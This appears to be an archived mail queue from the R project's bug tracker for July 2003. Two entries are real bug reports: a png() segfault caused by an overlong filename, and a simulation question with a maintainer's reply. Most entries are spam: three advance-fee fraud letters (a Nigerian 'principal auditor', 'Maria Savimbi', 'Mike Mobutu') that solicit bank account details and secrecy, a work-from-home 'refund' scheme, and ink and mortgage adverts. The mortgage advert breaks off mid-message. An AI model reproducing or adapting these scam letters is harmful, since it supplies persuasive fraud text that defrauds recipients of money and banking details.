~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3465 *
Subject: ASSISTANCE AND PARTNERSHIP
From: olarenwaju@post.cz
Date: Sat, 12 Jul 2003 04:12:46 +0200 (CEST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3465 <==
From olarenwaju@post.cz Sat Jul 12 04:13:06 2003
Received: from smtp1.vol.cz (smtp1.vol.cz [195.250.128.73])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h6C2D6JH003375
	for <r-bugs@biostat.ku.dk>; Sat, 12 Jul 2003 04:13:06 +0200 (MET DST)
Received: from webmail3.post.cz (webmail3.post.cz [212.20.96.251])
	by smtp1.vol.cz (8.12.8p1/8.12.8) with ESMTP id h6C2CumW046781;
	Sat, 12 Jul 2003 04:12:57 +0200 (CEST)
	(envelope-from olarenwaju@post.cz)
Received: from webmail3.post.cz (localhost [127.0.0.1])
	by webmail3.post.cz (8.12.8p1/8.12.8) with ESMTP id h6C2CumS001687;
	Sat, 12 Jul 2003 04:12:56 +0200 (CEST)
	(envelope-from olarenwaju@post.cz)
Received: (from www@localhost)
	by webmail3.post.cz (8.12.8p1/8.12.8/Submit) id h6C2Cku0001681;
	Sat, 12 Jul 2003 04:12:46 +0200 (CEST)
MIME-Version: 1.0
Subject: ASSISTANCE AND PARTNERSHIP
From: olarenwaju@post.cz
Sender: olarenwaju@post.cz
To: lekky73@37.com
Date: Sat, 12 Jul 2003 04:12:46 +0200 (CEST)
Message-ID: <0cefc33e03be2aa7d775bf9c64cb1139@www3.mail.post.cz>
X-Mailer: Volny.cz Webmail2 1.27
X-Originating-Ip: 66.205.18.149
X-Originating-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)
X-Priority: 3
X-MSMail-Priority: Normal
Content-Type: text/plain; charset="iso-8859-2"
Content-Transfer-Encoding: 7bit

           
FROM THE DESK OF; 
DR OLARENWAJU BALOGUN(PRINCIPAL AUDITOR} 
NIGERIA NATIONAL PETROLEUM CORPORATION(NNPC) 
FALOMO OFFICE COMPLEX 
IKOYI, LAGOS NIGERIA. 

PLEASE REPLY TO:lekky73@37.com 

Dear Sir, 
I guess my letter would not embarrass you since I 
have no previous correspondence with you. The 
foreign trade office of the Nigeria Chamber of 
Commerce and Industry gave me your company's details. 
My request however centers on mutual collaboration and your 
unflinching support to confidentially set-up a 
Joint-Venture outfit in your country 
I hope I would not regret approaching you in this 
matter. 
I am at present working as the Chairman of the Task 
Force that is reviewing all previous and present 
contract awarded by various ministries in the 
country. 
This appointment is from the office of the 
Presidency in the Federal Republic of Nigeria. Since 
the appointment took effect from November, 2000. The 
Task Force have jointly discovered some 
irregularities comprising of over invoice contract 
values. 
In the meantime, we have discovered about Nine 
Hundred and Eighty Million United States Dollars 
US$980,000,000.00). 
In our respective positions and status, this is an 
opportunity to enrich ourselves and our family, as a 
matter of fact, this is a timely opportunity 
considering the economic situation in this country, we 
have agreed to declare only Nine Hundred and Fifty-Six 
Million United States Dollars US$956,000,000.00) to 
the government while the balance of 
(US$24,000,000.00)Twenty - Four Million United States 
Dollars only will be remitted to your 
private/company's account. 
We hope to establish a Joint-Venture Business with you 
in your country. This money if accepted by you will be 
used in financing the cost of equity and other 
expenses for the take-off of the Joint Business.We 
have set out the machinery to enable us secure the 
effective remittance of this fund to your account, if 
only you can work with us.It is however noteworthy 
that this business is extremely sensitive and must be 
kept confidential. 
Furthermore, 30% of the money will be due 
for you as compensation for your effort and 
assistance, 10% for incidental expenses to be incurred 
on the course of transferring this fund while the 
rest goes into the Joint-Venture Project. Please note 
that remittance would be effective from 14 working 
days on receipt of your Bank Account 
details as follows: 
1. Bank Name and Address 
2. Account Number 
3. Beneficiary's name and address 
4. Private Telephone/Fax number for easy 
communication and confidentiality of this 
transaction. 
However, do endeavour to reply me if your capacity 
does not meet up our proposal so that I can 
further more negotiation. 

Best Regards, 
DR OLARENWAJU BALOGUN. 





poplatek vam nabizime Antivir, Antispam nebo dalsi kapacitu pro
vas Mailbox. Vice na: http://sluzby.volny.cz/product/postpaid/



-- 
Ziskejte kvalitu, kterou si zasluhujete. Za minimalni mesicni
poplatek vam nabizime Antivir, Antispam nebo dalsi kapacitu pro
vas Mailbox. Vice na: http://sluzby.volny.cz/product/postpaid/

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3466 *
Subject: finename length no check
From: nakama@ki.rim.or.jp
Date: Sat, 12 Jul 2003 08:54:39 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3466 <==
From nakama@ki.rim.or.jp Sat Jul 12 08:54:40 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h6C6sdJH004338
	for <R-bugs@biostat.ku.dk>; Sat, 12 Jul 2003 08:54:40 +0200 (MET DST)
Date: Sat, 12 Jul 2003 08:54:39 +0200 (MET DST)
Message-Id: <200307120654.h6C6sdJH004338@pubhealth.ku.dk>
From: nakama@ki.rim.or.jp
To: R-bugs@biostat.ku.dk
Subject: finename length no check

Full_Name: Ei-ji Nakama
Version: R-1.7.1
OS: Linux
Submission from: (NULL) (219.117.236.13)


> filename <- "----+----1----+----2----+----3----+----4----+----5----+----6----
+----7----+----8----+----9----+----0----+----1----+----2----+----3----+----4---
-+----5----+----6----+----7----+----8----+----9----+----0----+----1----+----2--
--+----3----+----4----+----5----+----6----+----7----+----8----+----9----+----0-
---+----1----+----2----+----3----+----4----+----5----+----6----+----7----+----8
----+----9----+----0----+----1----+----2----+----3----+----4----+----5----+----
6----+----7----+----8----+----9----+----0----+----1----+----2"
> png(file=filename,width=100,height=100,pointsize=12)
Segmentation fault

src/modules/X11/devX11.c

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3467 *
Subject: Mrs Maria Savimbi
From: MRS  MARIA SAVIMBI <mariasavimbi22@netscape.net>
Date: Sat, 12 Jul 2003 15:03:47 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3467 <==
From mariasavimbi22@netscape.net Sat Jul 12 15:04:46 2003
Received: from netscape528.com (ip503d827a.speed.planet.nl [80.61.130.122])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6CD4DJH005661
	for <r-bugs@biostat.ku.dk>; Sat, 12 Jul 2003 15:04:30 +0200 (MET DST)
Message-Id: <200307121304.h6CD4DJH005661@pubhealth.ku.dk>
From: MRS  MARIA SAVIMBI <mariasavimbi22@netscape.net>
To: r-bugs@biostat.ku.dk
Reply-To: mariasavimbi2@netscape.net
Subject: Mrs Maria Savimbi
Date: Sat, 12 Jul 2003 15:03:47 +0200
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="d7bcaaad-44d8-4291-97f4-ef21a61bf4b3"


This is a multi-part message in MIME format
--d7bcaaad-44d8-4291-97f4-ef21a61bf4b3
Content-Type: text/plain; charset=iso-8859-1
Content-Transfer-Encoding: quoted-printable

Good day,
This letter may come to you as a surprise due to the fact that we have not
yet met. The message could be strange but real if you pay some attention to
it. I could have notified you about it at least for the sake of your
integrity. Please accept my sincere apologies. In bringing this message of
goodwill to you, I have to say that I have no intentions of causing you any
pains.
I am Mrs. Maria . Savimbi, wife of the late rebel leader Jonas Savimbi of
Angola who was killed on the 22nd of February 2002 . I managed to get your
contact details through the internet myself Time is of the importance and I
was desperately looking for a person to assist
me in this confidential business.
My late husband, Jonas Savimbi was able to deposit a large sum of money in
different security firms in Europe. My husband  is dead  and the movement of
his family members (including me) is restricted. We are forbidden to either
travel broad or out of our localities. Presently our
movement are monitored. Right now there is a rush for all my husband's
wealth but home and Abroad by the present  Government who are claiming that
most of the wealth was got by Arms smuggling and therefore illegal and by my
husband 's extended family and relations.
His wealth has been estimated to be $500 million to over $1 billion and
being close to my husband  I happen to be in possession of documents and
information of some of the wealth.Approx. $250 million and only my trusted
son  knows that I have this information.
Presently,US$14,560,000.00 (FOURTEEN MILLION, FIVE HUNDRED AND SIXTY
THOUSAND DOLLARS) and  the  7,000kg of AU gold dust, 8500kg of pure Diamond
my husband  moved to Europe before his death is deposited with some security
firm . Before you can get access to it I have to give you the some hits.
I am therefore soliciting your help to travel to europe  to recieve this
money and keep it in a safe place or  into an account before my government
get wind of this fund .You know my husband  was a rebel leader in Angola
before his death.My reason for doing this is because it will be difficult
for the Angolan government to trace my husband 's  money to an individual's
account, especially when such an individual has no relationship,I decided to
keep that money for my family use.
I am currently and temporarily living in Angola with my family. My son who
has a temporary refugee status in The Netherlands, will work with you on my
behalf from there. Due to the political climate in Angola at the moment
being so sensitive and unstable for my family and me.
With this password and documents I will send to you via my son, when you are
ready I will give you the information needed on how you can get access to
this fund. You will then proceed to the Security Co in Europe  where the
US$14,560,000.00 (FOURTEEN MILLION, FIVE HUNDRED AND SIXTY THOUSAND DOLLARS)
will be given to you or transferred to an account you will provide.
Please acknowledge the receipt of this e-mail by reply e-mail.
Thanks for your anticipated assistance.
Yours sincerely,
Maria Savimbi.
  
--d7bcaaad-44d8-4291-97f4-ef21a61bf4b3--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3468 *
Subject: FedEx & UPS Consultant Refund Processors Needed                   VjP
From: 2recoverykkcv@earthlink.com
Date: Sat, 12 Jul 2003 12:35:56 -0100
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3468 <==
From 2recoverykkcv@earthlink.com Sat Jul 12 17:29:32 2003
Received: from earthlink.com (bdsl.66.14.152.64.gte.net [66.14.152.64])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6CFTQJH006171
	for <r-bugs@biostat.ku.dk>; Sat, 12 Jul 2003 17:29:29 +0200 (MET DST)
Message-ID: <e83401c3487a$85e986f0$35795b0e@kjebagry>
Reply-To: 2recoverykkcv@earthlink.com
From: 2recoverykkcv@earthlink.com
To: "Work@home" <r-bugs@biostat.ku.dk>
Subject: FedEx & UPS Consultant Refund Processors Needed                   VjP
Date: Sat, 12 Jul 2003 12:35:56 -0100
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="----=_NextPart_3B1_EA63_1545D64F.59D0F3D3"
X-Priority: 1
User-Agent: MIME-tools 5.503 (Entity 5.501)


------=_NextPart_3B1_EA63_1545D64F.59D0F3D3
Content-Type: text/plain;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable


------=_NextPart_3B1_EA63_1545D64F.59D0F3D3
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

TEVI0
 
 
 
<HTML><HEAD><TITLE>Recovery2</TITLE>
<META http-equiv=3DContent-Type content=3D"text/html; charset=3Dwindows=
-1252">
<META content=3D"MSHTML 6.00.2800.1170" name=3DGENERATOR></HEAD>
<BODY text=3D#000000 vLink=3D#0000aa aLink=3D#aa0000 link=3D#0000aa bgP=
roperties=3Dfixed 
background=3D""><FONT face=3DArial color=3D#ff0000 size=3D5>
<BLOCKQUOTE>
  <BLOCKQUOTE></FONT><BR><!-- Common part --><FONT color=3D#dd5555 
    size=3D+2><B>YOU CAN MAKE THOUSANDS OF DOLLARS!!! <BR></FONT><BR><F=
ONT 
    size=3D+1>You can make thousands of dollars <BR>just by using our s=
oftware and providing refund confirmation.<BR>I get close to $2500 each =
day<BR>from companies who I help them to get their guaranteed refund.
    <BR><BR>Join the program NOW, I think you will be surprised.<BR><BR=
>Become A 
    Recovery Consultant Today <BR><BR>It's 
    really that simple:<BR><BR>=95 You run a report on your software.<B=
R>=95 You 
    secure the refund.<BR>=95 You receive 50% of the refund.<BR><BR>Thi=
s truly is 
    the REAL DEAL, the one you've been looking for=85 <BR>Try the progr=
am for the 
    next 60 days with absolutely NO RISK TO YOU=85 <BR>so you can prove=
 to 
    yourself that YOU <BR>can make money working from home in your own =

    business.<BR>Before we get too far <BR>I want to assure you this op=
portunity 
    has NOTHING to do with MLM, <BR>Internet marketing, or some goofy s=
cheme. 
    <BR><BR><BR><FONT color=3D#dd5555 size=3D+2><B>It's simply an INCRE=
DIBLE 
    WORLDWIDE OPPORTUNITY!<BR></FONT><BR><BR><BR><BR>
    <FORM 
    action=3D"mailto:info@1000contacts.com?=3D&amp;subject=3DI want mor=
e information 2 R&amp;body=3DPlease send me all the information and put =
me on your lists" 
    method=3Dpost><INPUT type=3Dsubmit value=3D"Send me the information=
 PLEASE" name=3Dbuttonpushed></FORM><BR><BR><BR><BR><BR><FONT 
    color=3Dblack size=3D-1>(Opt-Out Instructions)<BR>This mailing is d=
one by an 
    independent marketing company.<BR>Please do not reply to this e-mai=
l, an 
    e-mail reply cannot be read.<BR>If you would like to be excluded in=
 the 
    future from our mailing list,<BR>just click below and send us an op=
t-out 
    request email.</FONT><BR><BR>
    <FORM action=3D"mailto:removemefromlist@FreeAutoBot.com?=3D&subject=
=3DRemove" method=3Dpost>
<INPUT name=3Dbuttonpushed type=3Dsubmit value=3D" Remove me NOW"></FOR=
M><br>
    <P></P></BLOCKQUOTE></BLOCKQUOTE>
<BLOCKQUOTE></BLOCKQUOTE></FONT>
<BLOCKQUOTE></BLOCKQUOTE></B></B></BODY></HTML>
 

N38yW


------=_NextPart_3B1_EA63_1545D64F.59D0F3D3--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3469 *
Subject: OEM QUAL1TY PRINT CARTRIDGES, SEVERELY DISCOUNTED PRICES.
From: "Printer" <savonink@thebestpr1ntbarga1n.com>
Date: Sat, 12 Jul 2003 08:43:21 -0700
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3469 <==
From savonink@thebestpr1ntbarga1n.com Sat Jul 12 18:02:02 2003
Received: from sertec2k.SERTEC (41.Red-80-32-109.pooles.rima-tde.net [80.32.109.41])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h6CG1wJH006313
	for <r-bugs@biostat.ku.dk>; Sat, 12 Jul 2003 18:02:00 +0200 (MET DST)
Message-Id: <200307121602.h6CG1wJH006313@pubhealth.ku.dk>
Received: from lchost9989.com (SERVER [218.79.227.202]) by sertec2k.SERTEC with SMTP (Microsoft Exchange Internet Mail Service Version 5.5.2653.13)
	id 3XCBCAS9; Sat, 12 Jul 2003 17:43:22 +0200
From: "Printer" <savonink@thebestpr1ntbarga1n.com>
To: rambo9@netscape.net
Date: Sat, 12 Jul 2003 08:43:21 -0700
Subject: OEM QUAL1TY PRINT CARTRIDGES, SEVERELY DISCOUNTED PRICES.
MIME-Version: 1.0
X-Mailer: Microsoft Outlook Express 6.00.2600.0000
X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
X-Precedence-Ref: l234056789zxcvbnm
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

80%   Percent   off   Printing   Supplies!

Come visit our store and experience what 
others have already, quality printing 
cartridges at great prices.

We offer most brands including, HP, Epson, 
Canon, and Lexmark.

Visit us today!

http://www.octo-1nk.com/ynot.html

-----------------------------------------
      100% Satisfaction Guaranteed.


_________________________________________
To discontinue advertisments, visit:
http://www.octo-1nk.com/s20.html


 [9^":}H&*TG0BK]


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3470 *
Subject: MR.MIKE MOBUTUE
From: "MR. MIKE MOBUTU" <mmobutu61@hknetmail.com>
Date: Sun, 13 Jul 2003 03:03:56 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3470 <==
From mmobutu61@hknetmail.com Sun Jul 13 03:03:58 2003
Received: from hknetmail780.com (node-c-0e7a.a2000.nl [62.194.14.122])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6D13tJH008249
	for <r-bugs@biostat.ku.dk>; Sun, 13 Jul 2003 03:03:56 +0200 (MET DST)
Message-Id: <200307130103.h6D13tJH008249@pubhealth.ku.dk>
From: "MR. MIKE MOBUTU" <mmobutu61@hknetmail.com>
To: r-bugs@biostat.ku.dk
Reply-To: mmobutu2@hknetmail.com
Subject: MR.MIKE MOBUTUE
Date: Sun, 13 Jul 2003 03:03:56 +0200
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="57a71472-5238-4c87-9823-6f2868675f6f"


This is a multi-part message in MIME format
--57a71472-5238-4c87-9823-6f2868675f6f
Content-Type: text/plain; charset=iso-8859-1
Content-Transfer-Encoding: quoted-printable

Good   Day,
 
 You may be suprise to receive this email since you do not know me.
 I am the son of the late president of Democratic Republic Of
 Zaire,President Mobutu Sese Seko, ( now The Republic Of Congo, under
 the leadership of the son of Mr. Laurent Kabila ). I presume you are
 aware there is a financial dispute between my family ( THE MOBUTUS ) and the=

 present civilian Government. This is based on what they believe as bad
 and corrupt governance on my late father's part. May his soul rest in
 perfect peace.As you might have heard how a lot of my father's bank account =
in
 Switzerland and North America have been frozen.
 Following the above named reasons, I am soliciting for your humble and
 confidential assistance to take custody of THIRTY Million United States
 Dollars ( US$30,000,000.00 ), also to front for me in the areas of
 business you desire profitable.
 These funds have secretly been deposited into a confidential Security
 Company, where it can easily be withdrawn or paid to a recommended
 beneficiary. The funds will be released to you by the Security Company,
 based on my recommendations, on that note, you will be presented as my
 partner who will be fronting for me  and my family in any subsequent
 ventures. Myself and my mother have decided to give 20% to you if you
 are able to help us claim this consignment.We have also decided to give you
 any money spent on phone calls or travelling expenses in the course of this
 transaction.
 
 Please, I need your entire support and co-operation for the success of
 this transaction, your utmost confidentiality and secrecy is highly
 required, due to my family's present predicament. I sincerely will =
appreciate
 your willingness to assist us as soon as possible.
 
 I am presently in the refugee camp here in the Netherlands under the
 united nations refugee camp in Netherlands and I can be reached on
 phone number +31-627-282-395 or via email mike_Mobutu@mmail.com for 
 more information on how we can proceed in this transaction.
 Please indicate your interest by sending your telephone and fax numbers
 or call me up at anytime. I sincerely will appreciate your
 acknowledgement  as soon as possible.
 Warmest regards,
 Mike Mobutu   Sese-Seko  
--57a71472-5238-4c87-9823-6f2868675f6f--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3471 *
Subject: Problems Simulating
From: smiles@dept.econ.yorku.ca
Date: Sun, 13 Jul 2003 05:51:58 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3471 <==
From smiles@dept.econ.yorku.ca Sun Jul 13 05:51:59 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h6D3pwJH008823
	for <R-bugs@biostat.ku.dk>; Sun, 13 Jul 2003 05:51:59 +0200 (MET DST)
Date: Sun, 13 Jul 2003 05:51:58 +0200 (MET DST)
Message-Id: <200307130351.h6D3pwJH008823@pubhealth.ku.dk>
From: smiles@dept.econ.yorku.ca
To: R-bugs@biostat.ku.dk
Subject: Problems Simulating

Full_Name: Stan Miles
Version: 1.5.0.
OS: Windows 2000 Server
Submission from: (NULL) (130.63.74.220)


Short Description of the Problem:  

I use R to simulate a random variable, with mean 0.14 and variance 0.2 .  I
simulate 20 sets, 30000 realizations/set.
I take the average of each set, and all 20 of the averages are 
much higher than 0.14.  In fact, they are All about 2-3 stdev higher. 
It seems that R is not generating the random variable with the mean I ask for.

The Details:

I simulate Prices [Pt] and Returns that are defined as 
Rt = [P(t)-P(t-1)]/P(t-1).  The returns have Normal distribution
=>  Rt is has N(mu=0.14, sigmaSquared=0.2) distribution.

To do the task above, I use the following files:

c:\ProgramFiles\R\rw1050\Code1.txt

consists of the following text:

====================
gpsim1_function(t,runs,mu,delta,stdev){
jold=0
xx_rep(0,t*runs)
for(i in 1:runs){
ind=(i-1)*t
xx[ind+1]=1
for(j in 2:t) {
xx[ind+j]_xx[ind+j-1]*
exp(rnorm(n=1,mean=mu*delta*delta,sd=stdev*delta))
}
}
xx

}

=======================

File "experiment4commands.txt" has text:

source("code1.txt")
aa=gpsim1(30000,1,0.14,0.052342392,0.4472135955)
sink("experiment4mu14z20Path1.txt")
for(i in 1:length(aa)){print(aa[i])}
sink()

source("code1.txt")
aa=gpsim1(30000,1,0.14,0.052342392,0.4472135955)
sink("experiment4mu14z20Path2.txt")
for(i in 1:length(aa)){print(aa[i])}
sink()

:
:
:

source("code1.txt")
aa=gpsim1(30000,1,0.14,0.052342392,0.4472135955)
sink("experiment4mu14z20Path20.txt")
for(i in 1:length(aa)){print(aa[i])}
sink()
=========================
{Above, 0.052342392 = 1/365, it is my discretization factor.}


I paste the text from the "experiment4commands.txt" file into R.

I now open each of the resulting 20 files in Excel.  The output [with 
variable Pt] is located in column B.  To get back Rt, I paste
the following formula into cells C2:C30000 - 
Ci = [B(i)-B(i-1)]/B(i-1).

My discretization factor was 1/365, thus, when I take the Average 
[and the Variance] of cells C2:C30000, I also have to multiply this 
number by 365, to get back the annual Rt.

I then made a table of the resulting 365*Average(C2:C30000), for each
of the 20 Sets that I have simulated using the methodology described above.


Set     365*Average(C2:C30000) for the set

1	0.284948
2	0.238827892
3	0.176492
4	0.242007
5	0.263882
6	0.211672
7	0.203536
8	0.19211
9	0.225185
10	0.234478
11	0.272792
12	0.205158
13	0.189349
14	0.222317
15	0.220652
16	0.165553
17	0.294211
18	0.333488
19	0.147971
20	0.290742

The average of the realizations of mu [true value = 0.14] over 
20 paths, each with 30000 observations, is about 0.23.

For this case, daily mu = mu over each algorithm step
is 0.14/365 = 0.0003835616438

The daily variance is 0.2/365 = 0.0005479452055

However, according to statistics, as the number of observations increases
variance will fall.  In particular, for 30,000 observations, the 
StDev is calculated as follows:  

SQRT(0.2/365)/SQRT(30000) = 0.0001351474 = {1 STDEV}

The average of the values in the table above, 0.23, is

[(0.23/365) - (0.14/365)]/0.0001351474 = 1.824 StDeviations above the mean.
As you can see Most of the 20 sets had realized values about 2-3 StDeviations
higher than the mean.

Something is wrong.

Thank you for considering this bug report.

==> 3471.reply.1 <==
From p.dalgaard@biostat.ku.dk Sun Jul 13 12:31:22 2003
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h6DAVLJH010303;
	Sun, 13 Jul 2003 12:31:21 +0200 (MET DST)
Received: from blueberry.kubism.ku.dk (localhost.localdomain [127.0.0.1])
	by blueberry.kubism.ku.dk (8.12.8/8.12.8) with ESMTP id h6DAYM8e007570;
	Sun, 13 Jul 2003 12:34:22 +0200
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.12.8/8.12.8/Submit) id h6DAYLX3007566;
	Sun, 13 Jul 2003 12:34:21 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: smiles@dept.econ.yorku.ca
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] Problems Simulating (PR#3471)
References: <200307130352.h6D3q0JH008827@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 13 Jul 2003 12:34:20 +0200
In-Reply-To: <200307130352.h6D3q0JH008827@pubhealth.ku.dk>
Message-ID: <x2vfu6af6b.fsf@biostat.ku.dk>
Lines: 26
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

smiles@dept.econ.yorku.ca writes:

> [(0.23/365) - (0.14/365)]/0.0001351474 = 1.824 StDeviations above the mean.
> As you can see Most of the 20 sets had realized values about 2-3 StDeviations
> higher than the mean.
> 
> Something is wrong.
> 
> Thank you for considering this bug report.

This is not a bug report. It is a request for finding the bug or
logical error in your code. If you had had a real bug to report, you
should have investigated more carefully and boiled it down to a much
simpler example. In particular, it is not a good idea to require the
use of commercial software on one particular computing platform to
reproduce your results when the same operations could just as easily
have been done in R.

Your R version is getting a bit old, BTW. The pre-1.7.x random
number generators had problems, but not of this magnitude.

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3472 *
Subject: In Debt? Would you like to refinance and save thousands? uieby ymuphji
From: "Gwendolyn Darden" <115gwzoq@lovemail.com>
Date: Mon, 14 Jul 03 00:20:42 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3472 <==
From 115gwzoq@lovemail.com Sun Jul 13 11:23:50 2003
Received: from 192.38.18.10 ([211.110.11.182])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6D9NjJH010070;
	Sun, 13 Jul 2003 11:23:47 +0200 (MET DST)
Received: from [234.52.186.220] by 192.38.18.10 with ESMTP id 80488659; Mon, 14 Jul 2003 00:20:42 -0100
Message-ID: <y$j$7z-$$41s301-744r26$u370@i7hpq6igszf>
From: "Gwendolyn Darden" <115gwzoq@lovemail.com>
Reply-To: "Gwendolyn Darden" <115gwzoq@lovemail.com>
To: ce@biostat.ku.dk
Subject: In Debt? Would you like to refinance and save thousands? uieby ymuphji
Date: Mon, 14 Jul 03 00:20:42 GMT
X-Mailer: Microsoft Outlook Express 6.00.2600.0000
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="5.2C_1_AB_CCF08BA"
X-Priority: 3
X-MSMail-Priority: Normal


--5.2C_1_AB_CCF08BA
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Untitled Document</title>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859=
-1">
</head>

<body><table width=3D"100%" height=3D"30" border=3D"0" cellpadding=3D"0" c=
ellspacing=3D"0">
  <tr> 
    <td width=3D"60" bgcolor=3D"#FFCC00"> </td>
    <td width=3D"400"><table width=3D"100%" border=3D"0" cellspacing=3D"2"=
 cellpadding=3D"2">
  <tr>
          <td><font style=3D"font: 18px Arial, Verdana, Helvetica, sans-se=
rif; color: #FF6600; font-weight: bold">.isnt 
            it time you refinanced your mortgage?..</font></td>
  </tr>
</table>
</td>
    <td width=3D"300" bgcolor=3D"#FFCC00"> </td>
    <td bgcolor=3D"#FF9900"> </td>
  </tr>
</table>
<table width=3D"100%" height=3D"2" border=3D"0" cellspacing=3D"0" cellpadd=
ing=3D"0">
  <tr> 
    <td width=3D"60"></td>
    <td width=3D"400"></td>
    <td width=3D"300"></td>
    <td></td>
  </tr>
</table>
<table width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
  <tr>
    <td width=3D"60" bgcolor=3D"#FFCC00"> </td>
    <td width=3D"400" valign=3D"top"><table width=3D"100%" border=3D"0" ce=
llspacing=3D"2" cellpadding=3D"2">
  <tr>
    <td><font style=3D"font: 13px Arial, Verdana, Helvetica, sans-serif; c=
olor: #4B4B4B; font-weight: bold">Why should you refinance your mortgage?<=
/font><br>
	 <font style=3D"font: 11px Arial, Verdana, Helvetica, sans-serif; color: =
#4B4B4B;">....The lower the interest rate is, the less that it will cost y=
ou to borrow the money. As a general rule, if the interest rate is 1 1/2 p=
oints lower than what you are currently paying, it's time to refinance you=
r mortgage!<br>
            <br>
            Ask one of our loan consultants to compare your expenses for v=
arious loan programs. In most cases you will be eligible for differing loa=
n programs so make sure you consider all of your options before making a c=
hoice.<p></font>
</td>
  </tr>
</table>
</td>
    <td width=3D"300" bgcolor=3D"#FF9900" valign=3D"top"> </td>
    <td bgcolor=3D"#FFCC00"> </td>
  </tr>
</table>
<table width=3D"100%" height=3D"2" border=3D"0" cellspacing=3D"0" cellpadd=
ing=3D"0">
  <tr> 
    <td width=3D"60"></td>
    <td width=3D"400"></td>
    <td width=3D"300"></td>
    <td></td>
  </tr>
</table>
<table width=3D"100%" border=3D"0" cellpadding=3D"0" cellspacing=3D"0">
  <tr> 
    <td width=3D"60" bgcolor=3D"#FF9900" valign=3D"bottom" align=3D"right"=
><table width=3D"50%" border=3D"0" cellspacing=3D"0" cellpadding=3D"3">
        <tr>
          <td><table width=3D"98%" bgcolor=3D"#FFFFFF" border=3D"0" cellsp=
acing=3D"0" cellpadding=3D"0">
        <tr>
          <td> </td>
        </tr>
      </table></td>
        </tr>
      </table></td>
    <td width=3D"400" valign=3D"top"><table width=3D"100%" border=3D"0" ce=
llspacing=3D"2" cellpadding=3D"2">
        <tr>
          <td> <table width=3D"80%" align=3D"center" border=3D"0" cellspac=
ing=3D"1" cellpadding=3D"2">
              <tr> 
                <td colspan=3D"2"><font style=3D"font: 26px Arial, Verdana=
, Helvetica, sans-serif; color: #000099; font-weight: bold"> 
                   .regardless of credit!</font></td>
              </tr>
              <tr> 
                <td><font style=3D"font: 12px Arial, Verdana, Helvetica, s=
ans-serif; color: #000000; font-weight: bold">=95 
                  Take advantage of lower interest rates</font></td>
              </tr>
              <tr> 
                <td><font style=3D"font: 12px Arial, Verdana, Helvetica, s=
ans-serif; color: #000000; font-weight: bold">=95 
                  Lower your payments</font></td>
              </tr>
              <tr> 
                <td><font style=3D"font: 12px Arial, Verdana, Helvetica, s=
ans-serif; color: #000000; font-weight: bold">=95 
                  Lenders will compete for your business</font></td>
              </tr>
              <tr> 
                <td colspan=3D"2"><font style=3D"font: 18px Arial, Verdana=
, Helvetica, sans-serif; color: #FF0101; font-weight: bold; text-decoratio=
n: blink;">Lower 
                  Rates Translate...<br>
                                      
